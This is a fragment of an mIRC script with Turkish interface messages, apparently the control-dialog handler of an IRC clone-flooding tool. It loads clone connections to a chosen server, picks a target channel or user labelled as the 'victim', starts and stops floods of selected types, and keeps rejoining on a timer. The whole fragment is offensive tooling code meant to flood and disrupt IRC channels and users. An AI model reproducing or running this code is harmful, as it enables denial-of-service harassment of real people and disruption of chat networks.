   on *:dialog:geno:sclick:*:{
     if ($did == 60)  {
       d/c
     }
     if ($did == 39) {
       if ($did(geno,39).state == 1) { info Identd server: ON }
       if ($did(geno,39).state == 0) { info Identd server: OFF | sockclose identd.geno* }
     }
     if ($did == 47) {
       if ($did(geno,47).state == 0) { info [Cloneler Çýktý] | .timergeno* off | unset %geno.clone* | sockclose geno.ip.probe |  return }
       set %geno.server-port $did(geno,18) $did(geno,16)
       if ($gettok(%geno.server-port,2,32) == $null) { Hata.msg ok Hata: Server parametreleri tam girilmedi | did -u geno 47 | return }
       unset %geno.clone*
       .timergeno* off
       set %geno.clones.modes $did(geno,17)
       var %tmp = $read -l10 $scriptdirayarlar.txt
       sockclose geno.ip.probe
       if ($remove($gettok(%geno.server-port,1,32),.) isletter ) && ($mid(%tmp,1,1) == 1) { sockopen geno.ip.probe %geno.server-port | info -Server Portu Yoðun - | info -Yükleme Deneniyor- | return }
       connect
     }
     if ($did == 7) && ($exists( [ [ $scriptdir ] $+ ] bunuoku.txt )) { run $scriptdirbunuoku.txt }
     if ($did == 44) { sockclose geno.ip.probe | if ($sock(geno*)) { sockwrite -tn geno* QUIT : [ $+ [ $did(geno,26) ] ] } | d/c }
     if ($did == 42) {
       if ($did(geno,19) == $null) { Hata.msg ok Hata: "Kanal\Kurban" seçilmedi | return }
       if ($sock(geno.irc*) == $null) { Hata.msg ok Hata: Cloneler Daha Yüklenmedi | return }
       .timergeno.flood* off
       .timergeno.rejoin off
       if ($gettok(%geno-victim,1,32) == c) { sockwrite -tn geno.irc* JOIN : $+ $gettok(%geno-victim,2,32) }
       if ($did(geno,31).state $+ $did(geno,32).state $+ $did(geno,33).state $+ $did(geno,34).state $+ $did(geno,35).state $+ $did(geno,36).state $+ $did(geno,37).state $+ $did(geno,38).state < 1) { Hata.msg ok Hata: flood türünü seç | return  }
       set %geno-victim $iif($left($did(geno,19),1) == + || $left($did(geno,19),1) == & ||  $left($did(geno,19),1) == $chr(35) ,c,n) $did(geno,19)
       if ($sock(geno.birc*)) { grejoin | .timergeno.rejoin -o 0 10 grejoin }
       set %geno.FloodX $did(geno,62).text
       unset %geno.genoflood.reps
       unset %geno.flood.type
       flood.set $gettok(%geno-victim,2-,32)
     }
     if ($did == 8) { .timertmpdelay 1 0 HARDCORE.unload }
     if ($did == 43) { flood.halt | info -Flood Durduruldu- }
     if ($did == 40) { gsave.set | .timergenominimize -o 0 0 gupload.set | dialog -x geno geno | window -pnk +Lb @HARDCORE 1 1 1 1 }
     if ($did == 41) { run www.thehun.net }
     if ($did == 1) { dialog -am OP.geno OP.geno }
   }
